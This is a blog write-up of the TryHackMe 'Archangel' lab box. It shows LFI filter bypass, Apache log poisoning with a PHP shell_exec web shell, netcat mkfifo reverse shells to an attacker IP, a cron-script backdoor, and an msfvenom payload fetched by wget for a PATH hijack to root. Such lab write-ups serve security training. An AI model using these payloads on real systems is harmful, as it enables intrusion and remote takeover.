@@ -1,0 +1,257 @@
+I"A7<p><img src="/img/posts/thm-archangel/archangel-logo.png" alt="Archangel Logo" /></p>
+
+<h1 id="introduction">Introduction</h1>
+
+<p>This is an easy rated box on <strong>TryHackMe</strong> cybersecurity training platform. The combination of vulnerabilities is a very good practice for <strong>OSCP</strong> exam since it combines common ones - chaining LFI and RCE, exploit of a cronjob and a SUID file.</p>
+
+<h1 id="enumeration">Enumeration</h1>
+<p>Thanks to <a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA">Ippsec</a> , the initial scan of every box is the same :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-oA</span> archangel 10.10.95.74
+</code></pre></div></div>
+<p>To clarify:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>-sV</th>
+      <th>-sC</th>
+      <th>-oA</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Enumerates versions</td>
+      <td>Uses standard vulnerability scripts</td>
+      <td>Outputs data to all formats</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>And these are the results :</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-06 06:31 EDT
+Nmap scan report for 10.10.95.74
+Host is up (0.057s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 
+| ssh-hostkey: 
+|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
+|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
+|_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Wavefire
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<p>Since I see only ssh &amp; a webserver I’m going for that Apache web server on port 80.</p>
+
+<p><img src="/img/posts/thm-archangel/webserver_80.png" alt="Webserver on port 80" /></p>
+
+<p>After checking out the webpage I see many links that dont go anywhere - a dead end.
+However, I noticed a domain name in the header :</p>
+
+<p><img src="/img/posts/thm-archangel/domain.png" alt="Domain name visible" /></p>
+
+<p>So lets try to add mafialive.thm to our hosts file. I’m using ParrotOS with a non-root account so I’ll be using sudo :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>vi /etc/hosts
+</code></pre></div></div>
+<p><img src="/img/posts/thm-archangel/adding_to_host_file.png" alt="Domain name visible" /></p>
+
+<p>Save the file and thats it!<br />
+Hostfiles were used in the old days before DNS came to be, and were used for IP to address mapping. Here is a <a href="http://www.steves-internet-guide.com/hosts-file/">link</a> for more info.<br />
+We are telling our machine that the IP address corresponds with a particular domain. Kind of like when you take a taxi and tell the address to your driver.</p>
+
+<p>Now lets go to domain <em>mafialive.thm</em>  :</p>
+
+<p><img src="/img/posts/thm-archangel/new_hostname.png" alt="New Domain" /></p>
+
+<p>Note that the flag is blurred.<br />
+Since I found no clues while checking the page with CTRL+U - i decided to gobust.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://mafialive.thm/ <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt <span class="nt">-t</span> 50 <span class="nt">-x</span> php,html,txt
+</code></pre></div></div>
+
+<p><img src="/img/posts/thm-archangel/gobusting_domain.png" alt="New Domain" /></p>
+
+<p>An interesting file pops up: <strong>test.php</strong><br />
+Let’s check it out:</p>
+
+<p><img src="/img/posts/thm-archangel/test_php.png" alt="New Domain" /></p>
+
+<p>Interesting. The page title is set to <strong>INCLUDE</strong>. Let’s open up BurpSuite and capture the traffic to see what’s going on.
+After this click on the button <em>Here is a button</em>.</p>
+
+<p><img src="/img/posts/thm-archangel/burp_initial.png" alt="Burp Initial capture" /></p>
+
+<h1 id="exploitation">Exploitation</h1>
+
+<p>After the traffic is captured - send it to the repeater with CTRL+R.</p>
+
+<p><img src="/img/posts/thm-archangel/repeater.png" alt="Burp Repeater" /></p>
+
+<p>Now we can play with the requests.<br />
+The box gave a hint by placing <strong>INCLUDE</strong> as the title - so trying Local File Inclusion is the next step.<br />
+After testing it out - I noticed a filter was present. The server seems to block our <strong>/</strong> character when going out of the <em>development_testing</em> directory.<br />
+So the next logical step is to try to add another :)</p>
+
+<p><img src="/img/posts/thm-archangel/lfi_initial.png" alt="Initial LFI" /></p>
+
+<p>And we get a response from the server :</p>
+
+<p><img src="/img/posts/thm-archangel/lfi_response.png" alt="LFI Response" /></p>
+
+<p>So the request was :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mrrobot.php..//..//..//..//..//..//etc//passwd
+</code></pre></div></div>
+
+<p>However, this does not help us to get the 2nd flag. After this, I switched to the <em>simple php base64 filter</em>.<br />
+We can just make a request directly in the browser and it will work just as easily :</p>
+
+<p><img src="/img/posts/thm-archangel/base64.png" alt="Php base64 filter" /></p>
+
+<p>The complete url is:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
+</code></pre></div></div>
+
+<p>So we are using <strong>php://filter/convert.base64-encode/resource=</strong> to select which file we want to encode in base64.</p>
+
+<p>Now we can copy that base64 input and decode it. I used a simple <em>base64 -d</em> :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+......"</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+</code></pre></div></div>
+<p>This reveals the source code of test.php with the visible flag :</p>
+
+<p><img src="/img/posts/thm-archangel/2nd_flag.png" alt="Base64 decode, 2nd flag" /></p>
+
+<p>Also, something is interesting about the code. Note that its specified that if our request contains <strong>../..</strong> and <strong>/var/www/html/development_testing</strong> that we 
+will get <strong>Sorry, Thats not allowed</strong> error message. We escaped that <strong>../..</strong> by using doube <strong>//</strong> earlier. Quite neat!</p>
+
+<p><img src="/img/posts/thm-archangel/interesting_code.png" alt="Php source code" /></p>
+
+<p>Now the next step is to turn LFI to Remote Code Execution (RCE).<br />
+Since the server is running Apache and I saw that we can access logs at <strong>/var/log/apache2/access.log</strong>
+It’s time for the classic log poisoning.  We will edit a request and send it with Burp. After this gets logged we should be able to execute code on the machine.</p>
+
+<p>The request is:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User Agent: &lt;?php echo '&lt;pre&gt;' . shell_exec($_GET['cmd']) . '&lt;/pre&gt;';?&gt;
+</code></pre></div></div>
+
+<p><img src="/img/posts/thm-archangel/log_poison.png" alt="Log Poisoning" /></p>
+
+<p>Now to check if our RCE is working:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>..//..//..//..//..//..//var//log//apache2//access.log&amp;cmd=ifconfig
+</code></pre></div></div>
+
+<p><img src="/img/posts/thm-archangel/log_poison_success.png" alt="RCE Successful" /></p>
+
+<p>Success!</p>
+
+<p>Due to server running Apache and executing php code &amp; our abbility to LFI - now we have working RCE.</p>
+
+<p>To get a reverse shell we can use the following code:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc IP PORT &gt;/tmp/f
+</code></pre></div></div>
+
+<p>After this, the next in line is setting up a netcat listener:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 80
+</code></pre></div></div>
+
+<p>Now we only have to make sure to URL encode the reverse shell request in Burp with CRTL+U. It should look like this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>....&amp;cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2&gt;%261|nc+10.9.83.183+80+&gt;/tmp/f
+</code></pre></div></div>
+
+<p><img src="/img/posts/thm-archangel/log_poison_success.png" alt="RCE Successful" /></p>
+
+<p>After sending the request we get a reverse shell as <strong>www-data</strong> :</p>
+
+<p><img src="/img/posts/thm-archangel/shell.png" alt="Shell" /></p>
+
+<p>#Elevation to User
+After getting this shell the next step is to convert it into a fully interactive tty. This is the following code that I’m using to do this:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash");'</span>
+<span class="nb">stty </span>rows 40 cols 190
+<span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>bash
+<span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+<span class="nb">export </span><span class="nv">LS_OPTIONS</span><span class="o">=</span><span class="s1">'--color=auto'</span>
+<span class="nb">eval</span> <span class="s2">"</span><span class="sb">`</span><span class="nb">dircolors</span><span class="sb">`</span><span class="s2">"</span>
+<span class="nb">alias ls</span><span class="o">=</span><span class="s1">'ls $LS_OPTIONS'</span>
+<span class="nb">export </span><span class="nv">PS1</span><span class="o">=</span><span class="s1">'\[\e]0;\u@\h: \w\a\]\[\033[01;32m\]\u@\h\[\033[01;34m\] \w\$\[\033[00m\] '</span>
+CTRL+Z
+<span class="nb">stty </span>raw <span class="nt">-echo</span>
+<span class="nb">fg
+</span>ENTER
+ENTER
+</code></pre></div></div>
+
+<p>After this is done, we have a fully interactive tty :</p>
+
+<p><img src="/img/posts/thm-archangel/tty_ok.png" alt="TTY" /></p>
+
+<p>To continue further - one of the first things to enumerate when trying to escalate privileges are cronjobs - scheduled tasks. I noticed this :</p>
+
+<p><img src="/img/posts/thm-archangel/crontab_user.png" alt="Cronjob - Archangel" /></p>
+
+<p>We have write privileges on a cronjob of user Archangel which is executing every 1 minute. This is what’s inside of the helloworld.sh :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="nb">echo</span> <span class="s2">"hello world"</span> <span class="o">&gt;&gt;</span> /opt/backupfiles/helloworld.txt
+</code></pre></div></div>
+
+<p>Let’s set up a netcat listener and append a reverse shell to the <em>helloworld.sh</em> file :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.9.83.183 80 &gt;/tmp/f"</span> <span class="o">&gt;&gt;</span> /opt/helloworld.sh
+</code></pre></div></div>
+
+<p>This gives us a shell :</p>
+
+<p><img src="/img/posts/thm-archangel/archangel_user.png" alt="Archangel - user" /></p>
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>After setting up our tty, we can see the 2 flags (user.txt &amp; user2.txt) and contents of the <strong>secrets/</strong> directory. There is a SUID inside which runs with <strong>root</strong> privileges when run by the user <em>Archangel</em>:</p>
+
+<p><img src="/img/posts/thm-archangel/archangel_interesting.png" alt="Archangel - flag" /></p>
+
+<p>After running it and checking it out with <strong>strings</strong> I notice that the <strong>cp</strong> command is run without the full path annotation. This is exploitable.</p>
+
+<p>We can create a msfvenom payload called <strong>cp</strong> and adjust our <em>PATH</em> variable and when executing <strong>./backup</strong> we should get a reverse shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> linux/x64/shell_reverse_tcp <span class="nt">-f</span> elf <span class="nt">-o</span> <span class="nb">cp </span><span class="nv">LHOST</span><span class="o">=</span>10.9.83.183 <span class="nv">LPORT</span><span class="o">=</span>80
+</code></pre></div></div>
+
+<p>We can set up a python server and transfer this file over to /home/arcahngel/secret/ with wget. On our machine :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+
+<p>On the target:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://10.9.83.183/cp
+</code></pre></div></div>
+
+<p>We can  modify our <em>PATH</em> variable :</p>
+
+<p><img src="/img/posts/thm-archangel/path_modify.png" alt="$PATH modified" /></p>
+
+<p>Set up a netcat listener, and then make the file <strong>cp</strong> executable and run the <strong>./backup</strong> :</p>
+
+<p><img src="/img/posts/thm-archangel/executing_backup.png" alt="Executing backup" /></p>
+
+<p>This returns us the root shell :</p>
+
+<p><img src="/img/posts/thm-archangel/proof_txt.png" alt="Rooted" /></p>
+
+<h2 id="conclusion">Conclusion</h2>
+<p>This was a very interesting box with common vulnerabilites.</p>
+
+:ET
